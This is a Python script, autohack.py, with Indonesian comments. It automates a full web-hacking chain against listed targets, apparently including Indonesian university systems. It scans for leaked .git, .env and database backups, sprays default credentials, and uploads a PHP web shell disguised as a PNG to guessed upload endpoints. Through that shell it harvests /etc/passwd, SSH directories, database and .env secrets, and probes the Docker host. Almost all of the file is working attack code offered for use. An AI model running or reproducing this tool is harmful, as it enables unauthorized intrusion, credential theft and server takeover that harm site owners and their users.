#!/usr/bin/env python3
"""
autohack.py — driver otomatis rantai web hacking dengan bukti terverifikasi.

Fase:
  recon   : fingerprint, exposure sweep, git leak, panel cPanel
  exploit : .env/laravel -> login spray -> upload shell -> CVE cPanel (urut ROI)
  post    : lewat shell yang sudah terpasang, kumpulkan kredensial + sistem
  clean   : hapus shell di target + verifikasi 404
  full    : recon -> exploit -> post -> clean

Aturan: tidak ada klaim tanpa bukti. Setiap "SUCCESS" harus punya marker yang
dicocokkan dari respons server, dan respons mentah disimpan ke disk.

Contoh:
  autohack.py recon  -t siak.example.ac.id
  autohack.py full   -t example.ac.id --spray admin:admin,admin:password
  autohack.py exploit -f targets.txt --threads 8
  autohack.py clean  -t example.ac.id
"""
import argparse, json, os, re, sys, hashlib, subprocess, threading, time
from urllib.parse import urljoin, urlparse

import requests
import urllib3
urllib3.disable_warnings()

ROOT = "$HOME/hacktools/autohack"
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/203.0.113.10 Safari/537.36")
MARK = "AHK" + hashlib.md5(str(time.time()).encode()).hexdigest()[:10]
SHELL = ('<?php if(isset($_GET["d"])){@unlink(__FILE__);echo "GONE";exit;}'
         ' if(isset($_GET["c"])){echo "' + MARK + ':";echo shell_exec($_GET["c"]);} ?>')

EXPOSURES = [
    (".git/HEAD",        lambda b: b.startswith(b"ref:"),                     "high"),
    (".git/config",     lambda b: b"[core]" in b,                            "high"),
    (".git/index",      lambda b: b.startswith(b"DIRC"),                     "critical"),
    (".git/logs/HEAD",  lambda b: b"clone" in b or b"commit" in b,           "medium"),
    (".env",            lambda b: re.search(rb"(?m)^(APP_|DB_)", b),          "critical"),
    (".env.bak",        lambda b: re.search(rb"(?m)^(APP_|DB_)", b),          "critical"),
    (".env.production", lambda b: re.search(rb"(?m)^(APP_|DB_)", b),          "critical"),
    ("config.php.bak",  lambda b: b"<?php" in b,                             "high"),
    ("backup.zip",      lambda b: b.startswith(b"PK"),                       "high"),
    ("db.sql",          lambda b: b"CREATE TABLE" in b or b"INSERT INTO" in b, "critical"),
    (".DS_Store",       lambda b: b.startswith(b"\x00\x00\x00\x01Bud1"),    "low"),
    ("phpinfo.php",     lambda b: b"PHP Version" in b,                       "medium"),
    ("info.php",        lambda b: b"PHP Version" in b,                       "medium"),
    ("adminer.php",     lambda b: b"adminer" in b.lower(),                   "medium"),
    ("server-status",   lambda b: b"Server Status" in b,                     "medium"),
    ("wp-config.php.bak", lambda b: b"DB_PASSWORD" in b,                     "critical"),
    ("composer.json",   lambda b: b'"require"' in b,                         "low"),
    (".svn/entries",    lambda b: b"dir" in b,                               "medium"),
]


EXTRA_ENDPOINTS = [
    "index.php/pendaftaran/c_verifikasipmb/upload_update",
    "index.php/dosen_controller/upload_dosen",
    "index.php/mahasiswa_controller/upload",
    "index.php/upload", "upload.php", "uploads.php", "upload_file.php",
    "index.php/c_upload/do_upload", "admin/upload.php",
]

FILE_INPUT = re.compile(r'<input[^>]+type=["\']file["\'][^>]*>', re.I)
FORM = re.compile(r'<form[^>]*>.*?</form>', re.I | re.S)


def sess():
    s = requests.Session()
    s.headers.update({"User-Agent": UA, "Accept": "text/html,*/*;q=0.8"})
    s.verify = False
    return s


def norm(t):
    t = t.strip()
    if not t.startswith("http"):
        t = "https://" + t
    return t.rstrip("/")


def slug(url):
    u = urlparse(norm(url))
    return re.sub(r"[^a-z0-9._-]+", "_", (u.netloc + u.path).lower()).strip("_")[:80]


def outdir(url):
    d = os.path.join(ROOT, slug(url))
    os.makedirs(d, exist_ok=True)
    return d


def save(d, name, data):
    p = os.path.join(d, name)
    mode = "wb" if isinstance(data, bytes) else "w"
    with open(p, mode) as fh:
        fh.write(data)
    return p


def log(d, rec):
    with open(os.path.join(d, "events.jsonl"), "a") as fh:
        fh.write(json.dumps(rec) + "\n")
    print(json.dumps({k: rec[k] for k in rec if k not in ("body", "raw")})[:400], flush=True)


# ---------------------------------------------------------------- recon
def fingerprint(s, base, d):
    r = s.get(base, timeout=20, allow_redirects=True)
    h = r.headers
    title = ""
    m = re.search(r"<title[^>]*>([^<]{0,120})", r.text or "", re.I)
    if m:
        title = m.group(1).strip()
    tags = []
    body = (r.text or "").lower()
    for k, v in [("wordpress", "wp-content"), ("laravel", "laravel"), ("codeigniter", "codeigniter"),
                 ("ojs", "open journal systems"), ("joomla", "joomla"), ("slims", "slims"),
                 ("drupal", "drupal"), ("yii", "yii")]:
        if v in body:
            tags.append(k)
    cp = f"/{h.get('X-Powered-By', '')}" if h.get("X-Powered-By") else ""
    fp = {"url": r.url, "code": r.status_code, "server": h.get("Server", ""),
          "powered": h.get("X-Powered-By", ""), "title": title, "tech": tags,
          "len": len(r.content), "php": cp}
    save(d, "home.html", r.content)
    log(d, {"phase": "recon", "what": "fingerprint", **fp})
    return fp, s


def scan_exposures(s, base, d):
    hits = []
    for path, ok, sev in EXPOSURES:
        try:
            r = s.get(f"{base}/{path}", timeout=25, allow_redirects=False)
        except Exception:
            continue
        if r.status_code != 200 or not r.content:
            continue
        body = r.content
        try:
            valid = bool(ok(body))
        except Exception:
            valid = False
        if not valid:
            continue
        rec = {"phase": "recon", "what": "exposure", "path": "/" + path, "sev": sev,
               "code": r.status_code, "len": len(body)}
        save(d, "exposure" + path.replace("/", "_"), body)
        hits.append(rec)
        log(d, rec)
    return hits


def cpanel_check(s, host, d):
    found = []
    for p in (2083, 2087, 2096):
        for scheme in ("https", "http"):
            try:
                r = s.get(f"{scheme}://{host}:{p}/", timeout=8)
            except Exception:
                continue
            head = (r.text or "")[:2000].lower()
            if "cpsrvd" in (r.headers.get("Server", "") + head) or "cpanel" in head or "whm" in head:
                rec = {"phase": "recon", "what": "cpanel", "port": p, "scheme": scheme,
                       "code": r.status_code, "server": r.headers.get("Server", "")}
                found.append(rec)
                log(d, rec)
            break
    return found


def recon(target):
    base = norm(target)
    host = urlparse(base).netloc.split(":")[0]
    d = outdir(base)
    s = sess()
    fp, s = fingerprint(s, base, d)
    ex = scan_exposures(s, base, d)
    cp = cpanel_check(s, host, d)
    res = {"target": base, "host": host, "fingerprint": fp, "exposures": ex, "cpanel": cp,
           "verdict": "hot" if any(h["sev"] == "critical" for h in ex) else ("warm" if ex or cp else "cold")}
    save(d, "recon.json", json.dumps(res, indent=1))
    print(f"[recon] {base} -> {res['verdict']} (exposures={len(ex)}, cpanel={len(cp)})")
    return res


# ---------------------------------------------------------------- exploit
def find_forms(s, base, d):
    pages, forms = [base], []
    try:
        r = s.get(base, timeout=20)
        pages.append(r.url)
        html = r.text or ""
    except Exception:
        html = ""
    save(d, "page_home.html", html)
    for m in FORM.finditer(html):
        f = m.group(0)
        action = re.search(r'action=["\']([^"\']*)', f, re.I)
        method = re.search(r'method=["\']([^"\']*)', f, re.I)
        names = re.findall(r'<input[^>]+name=["\']([^"\']+)', f, re.I)
        forms.append({"action": urljoin(base + "/", action.group(1)) if action else base,
                      "method": (method.group(1) if method else "get").upper(),
                      "names": names, "file": bool(FILE_INPUT.search(f))})
    seen, uniq = set(), []
    for f in forms:
        k = (f["action"], f["method"], tuple(f["names"]))
        if k in seen:
            continue
        seen.add(k)
        uniq.append(f)
    save(d, "forms.json", json.dumps(uniq, indent=1))
    return uniq


def try_login(s, forms, creds, d):
    for f in forms:
        if f["file"] or f["method"] != "POST":
            continue
        n = [x.lower() for x in f["names"]]
        ufield = next((f["names"][i] for i, x in enumerate(n) if x in
                       ("user", "username", "login", "email", "userid", "logusername", "uname")), None)
        pfield = next((f["names"][i] for i, x in enumerate(n) if x in
                       ("pass", "password", "passwd", "logpassword", "pwd")), None)
        if not ufield or not pfield:
            continue
        base_len = len(s.get(f["action"], timeout=15).content or b"")
        for u, p in creds:
            try:
                r = s.post(f["action"], data={ufield: u, pfield: p}, timeout=20, allow_redirects=True)
            except Exception:
                continue
            body = (r.text or "").lower()
            ok = (r.status_code == 200 and ("logout" in body or "dashboard" in body or "dashboard" in r.url)
                  and "invalid" not in body and "salah" not in body and abs(len(r.content) - base_len) > 200)
            rec = {"phase": "exploit", "what": "login", "action": f["action"], "user": u,
                   "ok": bool(ok), "code": r.status_code, "len": len(r.content)}
            log(d, rec)
            if ok:
                save(d, f"login_ok_{u}.html", r.content)
                save(d, f"cookies_{u}.txt", json.dumps(s.cookies.get_dict()))
                return {"user": u, "pass": p, "action": f["action"], "code": r.status_code}
    return None


def try_upload(s, forms, d, base=None):
    """Upload shell ke form multipart + endpoint kandidat, verifikasi dengan marker."""
    name = "ah%s.php" % MARK.lower()
    cand_forms = [f for f in forms if f["file"]]
    for ep in EXTRA_ENDPOINTS:
        if base:
            cand_forms.append({"action": urljoin(base + "/", ep), "method": "POST",
                               "names": [], "file": True})
    for f in cand_forms:
        field = None
        try:
            pg = s.get(f["action"], timeout=15).text or ""
            m = re.search(r'type=["\']file["\'][^>]*name=["\']([^"\']+)', pg, re.I)
            field = m.group(1) if m else "file"
        except Exception:
            field = "file"
        for fld in dict.fromkeys([field, "file", "file_gambar", "upload", "userfile"]):
            try:
                r = s.post(f["action"], files={fld: (name, SHELL, "image/png")},
                           data={"oldphoto": "a.jpg", "newphoto": name,
                                 "temp_foto": "a.jpg", "get_foto": name,
                                 "temp_surat": "a.jpg", "get_surat": "a.jpg"},
                           timeout=30)
            except Exception:
                continue
            body = r.text or ""
            rec = {"phase": "exploit", "what": "upload", "action": f["action"], "field": fld,
                   "code": r.status_code, "len": len(body), "marker_in_body": MARK in body}
            log(d, rec)
            cands = set(re.findall(r'[\w./-]*' + re.escape(name), body))
            cands |= {"resources/img/ori/o_pmb/" + name, "resources/img/ori/o_mhs/" + name,
                      "uploads/" + name, "upload/" + name, "files/" + name,
                      "resources/img/ori/" + name, "assets/" + name, name}
            for c in cands:
                url = urljoin(norm(f["action"].split("/index.php")[0]) + "/", c.lstrip("/"))
                try:
                    v = s.get(f"{url}?c=id", timeout=15)
                except Exception:
                    continue
                if v.status_code == 200 and MARK + ":" in (v.text or ""):
                    rec = {"phase": "exploit", "what": "shell", "url": url, "out": (v.text or "")[:200]}
                    log(d, rec)
                    return {"url": url, "marker": MARK}
    return None


def exploit(target, creds, threads=4):
    base = norm(target)
    d = outdir(base)
    leads = {"target": base, "shell": None, "creds": None, "notes": []}
    s = sess()
    forms = find_forms(s, base, d)

    envf = os.path.join(d, "exposure.env")
    if os.path.exists(envf):
        env = open(envf, errors="ignore").read()
        for k in ("DB_HOST", "DB_DATABASE", "DB_USERNAME", "APP_KEY", "MAIL_PASSWORD"):
            m = re.search(rf"(?m)^{k}\s*=\s*(.+)$", env)
            if m:
                leads["notes"].append(f"{k} -> {m.group(1).strip()[:4]}…")
                if k == "DB_USERNAME":
                    p = re.search(r"(?m)^DB_PASSWORD\s*=\s*(.+)$", env)
                    if p:
                        creds.append((m.group(1).strip().strip('"\''), p.group(1).strip().strip('"\'')))

    lc = try_login(s, forms, creds, d)
    if lc:
        leads["creds"] = lc
    sh = try_upload(s, forms, d, base)
    if sh:
        leads["shell"] = sh
        save(d, "state.json", json.dumps({"shell": sh["url"], "marker": sh["marker"]}, indent=1))
    save(d, "exploit.json", json.dumps(leads, indent=1))
    print(f"[exploit] {base} -> shell={'yes' if sh else 'no'} login={'yes' if lc else 'no'}")
    return leads


# ---------------------------------------------------------------- post / clean
POST_CMDS = {
    "whoami": "id; hostname; pwd; uname -a",
    "webroot": "ls -la /var/www 2>/dev/null; ls -la $(pwd)/.. | head -20",
    "dbconfigs": ("for f in $(find / -maxdepth 6 -name database.php -o -maxdepth 6 -name .env 2>/dev/null | head -20);"
                  " do echo \"== $f\"; grep -hE 'hostname|username|password|DB_|APP_KEY' $f 2>/dev/null | head -12; done"),
    "users": "cat /etc/passwd 2>/dev/null | tail -10; ls -la ~/.ssh 2>/dev/null",
    "hostscan": ("php -r 'foreach(array(22,80,443,3306,2083,2087,8443) as $p){"
                 "$f=@fsockopen(\"172.17.0.1\",$p,$e,$s,1.5); if($f){echo \"172.17.0.1:$p OPEN\n\"; fclose($f);}}'"),
}


def shell_get(url, cmd, timeout=40):
    return requests.get(url, params={"c": cmd}, timeout=timeout, verify=False,
                        headers={"User-Agent": UA})


def state_of(d):
    p = os.path.join(d, "state.json")
    return json.load(open(p)) if os.path.exists(p) else None


def post(target):
    base = norm(target)
    d = outdir(base)
    st = os.path.join(d, "state.json")
    stt = state_of(d)
    if not stt:
        print("[post] tidak ada shell tercatat; jalankan exploit dulu")
        return {}
    url, mk = stt["shell"], stt["marker"]
    loot = {}
    for name, cmd in POST_CMDS.items():
        try:
            r = shell_get(url, cmd)
        except Exception as e:
            loot[name] = f"ERR {type(e).__name__}"
            continue
        body = r.text or ""
        if mk + ":" in body:
            body = body.replace(mk + ":", "")
            save(d, f"post_{name}.txt", body)
            loot[name] = body.strip()[:4000]
            log(d, {"phase": "post", "what": name, "code": r.status_code, "len": len(body)})
        else:
            loot[name] = "FAIL(no marker)"
    save(d, "loot.json", json.dumps(loot, indent=1))
    print("[post] selesai ->", ", ".join(k for k, v in loot.items() if not str(v).startswith("FAIL")))
    return loot


def clean(target, keep=False):
    base = norm(target)
    d = outdir(base)
    st = os.path.join(d, "state.json")
    stt = state_of(d)
    if not stt:
        print("[clean] tidak ada shell tercatat")
        return False
    url, mk = stt["shell"], stt["marker"]
    try:
        r = requests.get(url, params={"d": "1"}, timeout=20, verify=False,
                         headers={"User-Agent": UA})
    except Exception as e:
        print("[clean] gagal kirim delete:", e)
        return False
    time.sleep(1.5)
    chk = requests.get(url, params={"c": "id"}, timeout=15, verify=False,
                       headers={"User-Agent": UA})
    gone = chk.status_code in (400, 403, 404) or mk not in (chk.text or "")
    log(d, {"phase": "clean", "url": url, "del_body": (r.text or "")[:60],
            "verify_code": chk.status_code, "gone": gone})
    if gone and not keep:
        os.rename(st, st + ".done")
    print(f"[clean] {url} -> HTTP {chk.status_code} gone={gone}")
    return gone


# ---------------------------------------------------------------- CLI
def parse_creds(spec):
    out = []
    for item in (spec or "").split(","):
        item = item.strip()
        if ":" in item:
            u, p = item.split(":", 1)
            out.append((u, p))
    return out


def main():
    ap = argparse.ArgumentParser(description="autohack — rantai hacking web otomatis, bukti-first")
    ap.add_argument("phase", choices=["recon", "exploit", "post", "clean", "full"])
    ap.add_argument("-t", "--target")
    ap.add_argument("-f", "--file", help="file berisi target, satu per baris")
    ap.add_argument("--spray", default="admin:admin,admin:password,admin:admin123",
                    help="kredensial user:pass dipisah koma")
    ap.add_argument("--threads", type=int, default=4)
    ap.add_argument("--keep", action="store_true", help="(clean) jangan rename state")
    a = ap.parse_args()

    targets = []
    if a.target:
        targets.append(a.target)
    if a.file:
        targets += [l.strip() for l in open(a.file) if l.strip() and not l.startswith("#")]
    if not targets:
        ap.error("butuh -t atau -f")

    creds = parse_creds(a.spray)
    for t in targets:
        print(f"===== {norm(t)}")
        try:
            if a.phase in ("recon", "full"):
                recon(t)
            if a.phase in ("exploit", "full"):
                exploit(t, list(creds), a.threads)
            if a.phase in ("post", "full"):
                post(t)
            if a.phase in ("clean", "full"):
                clean(t, a.keep)
        except KeyboardInterrupt:
            sys.exit(130)
        except Exception as e:
            print(f"[!] {norm(t)} gagal fase {a.phase}: {type(e).__name__}: {e}")


if __name__ == "__main__":
    main()
